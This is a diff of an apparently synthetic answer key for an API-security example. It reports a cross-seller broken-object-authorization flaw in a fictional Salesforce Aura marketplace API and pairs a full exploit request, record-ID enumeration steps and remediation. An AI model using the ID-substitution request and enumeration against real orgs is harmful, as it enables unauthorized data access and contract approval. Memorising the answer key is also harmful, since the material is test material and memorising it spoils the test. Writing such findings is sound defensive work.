@@ -1,73 +1,66 @@
 # Expected Response
 
 ## System
-- Domain: E-Commerce / Marketplace
-- System: ShopGrid Marketplace API (Salesforce-Integrated)
+- System: ShopGrid Marketplace API (Salesforce-Integrated) v1.6.0
+- Domain: E-COMMERCE / MARKETPLACE
 - Example ID: SF-0253
+- Risk IDs: RISK-SF-253, RISK-SF-254
 
-## Priority Findings
+## Findings
 
-### Finding 1: Salesforce Aura BOLA — Multi-tenant / cross-tenant access (Pattern 1.5)
-**Severity:** Critical
-**Category:** BOLA
-**OWASP API:** API1:2023 Broken Object Level Authorization
+### 1. Pattern 1.5 — Cross-Tenant/Cross-Seller Contract Access: `c.ContractController.approveContract` (HAR Primary)
 
-**Summary:**
-The Salesforce Aura controller action `c.LeadController.getLeadData` is vulnerable to Pattern 1.5.
-The Apex controller is declared `without sharing` and performs no ownership validation.
-An authenticated user can substitute any `leadId` value in the Aura framework
-`POST /aura` request payload to read records owned by other users.
+The Aura controller `c.ContractController.approveContract` accepts a client-supplied `contractId`. Pattern 1.5 "multi-tenant / cross-tenant access" — one marketplace seller can access or approve contracts belonging to another seller by substituting the `contractId`. The `without sharing` class (RISK-SF-253) bypasses OWD=Private, and the missing `OwnerId` predicate (RISK-SF-254) means cross-seller access succeeds.
+
+In E-Commerce / Marketplace, Contract records contain seller agreements, pricing terms, vendor SSN PII, and payment processor configurations. Cross-seller access enables competitor intelligence gathering and unauthorized contract approval — a significant marketplace integrity violation.
 
 **Evidence from HAR:**
-- Aura action: `c.LeadController.getLeadData`
-- Requested `leadId`: `001C647` (belongs to a different user)
-- Response state: `SUCCESS` — no authorization error
-- Response body includes `SensitiveData__c` and `InternalNotes__c` belonging to another user
-- The session user's `OwnerId` does not match the returned record's `OwnerId`
+- Aura action: `c.ContractController.approveContract`
+- Requested `contractId`: `001C647` — belongs to `OwnerId: "005VICTIM"` (another seller)
+- Session: `57ebc647.lightning.force.com` — request came from authenticated marketplace user
+- Response state: `SUCCESS` — cross-seller contract approved without authorization check
+- Response includes `SensitiveData__c: "SSN: 000-78-9611"` and `InternalNotes__c: "CONFIDENTIAL: internal review notes"` — vendor PII exposed
 
-**Root Cause:**
-1. Apex class declared `without sharing` — Salesforce OWD/sharing rules are bypassed
-2. SOQL query filters only by `leadId` — no `AND OwnerId = UserInfo.getUserId()` predicate
-3. `leadId` sourced directly from Aura params without server-side validation
+## Reproduction
 
-## Steps to Reproduce
-
-### Step 1 — Capture a baseline Aura request to your own record
+**Step 1 — Capture baseline Aura request:**
 Intercept a legitimate Aura request using Burp Suite or browser DevTools.
-Identify the `c.LeadController.getLeadData` action in the `message` POST body.
-Record your own `leadId` value (e.g., `001YOURRECORDID000000`).
+Identify `c.ContractController.approveContract` in the `message` POST body.
+Record your own `contractId`.
 
-### Step 2 — Enumerate or guess victim record IDs
-Salesforce record IDs follow a predictable 18-character pattern with a 3-char prefix.
-Use the list endpoint or sequential enumeration to discover victim `leadId` values.
-
-### Step 3 — Substitute victim ID in Aura request
+**Step 2 — Substitute victim `contractId` — cross-seller contract access (primary HAR attack):**
 ```
-POST https://<ORG_ID>.lightning.force.com/aura HTTP/1.1
-Authorization: Bearer <YOUR_SESSION_TOKEN>
+POST https://57ebc647.lightning.force.com/aura HTTP/1.1
+Authorization: Bearer 00D57EBC647!AR57ebc647...
 Content-Type: application/x-www-form-urlencoded
+X-SFDC-Session: 00D57EBC647!AR57ebc647...
 
-message={"actions":[{"id":"1;a","descriptor":"c.LeadController.getLeadData","callingDescriptor":"UNKNOWN",
-"params":{"leadId":"001C647","fields":["Id","Name","OwnerId","SensitiveData__c","InternalNotes__c"]}}]}
+message={"actions":[{"id":"1;a","descriptor":"c.ContractController.approveContract","callingDescriptor":"UNKNOWN",
+"params":{"contractId":"001C647","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
 &aura.token=undefined
 ```
 
-### Step 4 — Verify BOLA
-**Vulnerable outcome:** Response `state: "SUCCESS"` with victim record data including
-`SensitiveData__c` and `InternalNotes__c`. The `OwnerId` in the response will differ
-from your authenticated user ID.
+**Step 3 — Enumerate adjacent Contract IDs (marketplace sellers):**
+```
+contractId: 001C646, 001C648, 001C649, ...
+```
 
-**Secure outcome:** Response `state: "ERROR"` with an authorization message, or empty `records` array.
+**Step 4 — Verify cross-tenant access:**
+**Vulnerable outcome:** Response `state: "SUCCESS"` with victim seller's Contract data including:
+- `SensitiveData__c: "SSN: 000-78-9611"` — vendor SSN exposed
+- `InternalNotes__c: "CONFIDENTIAL: internal review notes"` — private seller notes
+- `OwnerId: "005VICTIM"` — contract belongs to a different seller; cross-tenant access confirmed
+
+**Secure outcome:** Response `state: "ERROR"` with `INSUFFICIENT_ACCESS` or empty `records` array.
 
 ## Remediation
-1. **Add `with sharing` to Apex class declaration:**
+1. **Add `with sharing` to Apex class (RISK-SF-253):**
    ```apex
-   public with sharing class LeadController { ... }
+   public with sharing class ContractController { ... }
    ```
-2. **Add ownership filter to SOQL:**
+2. **Add ownership filter to SOQL (RISK-SF-254):**
    ```apex
-   WHERE Id = :leadId AND OwnerId = :UserInfo.getUserId()
+   WHERE Id = :contractId AND OwnerId = :UserInfo.getUserId()
    ```
-3. **Use `WITH SECURITY_ENFORCED` in all SOQL queries.**
-4. **Validate `leadId` against the user's accessible record IDs before querying.**
-5. **Automated test:** Write a Salesforce Apex test that authenticates as User A and requests User B's record ID — assert INSUFFICIENT_ACCESS or empty result.
+3. **Use `WITH SECURITY_ENFORCED` in all SOQL queries** to enforce record-level security.
+4. **Automated test:** Apex test authenticating as Seller A requesting Seller B's `contractId` — assert `INSUFFICIENT_ACCESS` or empty result.
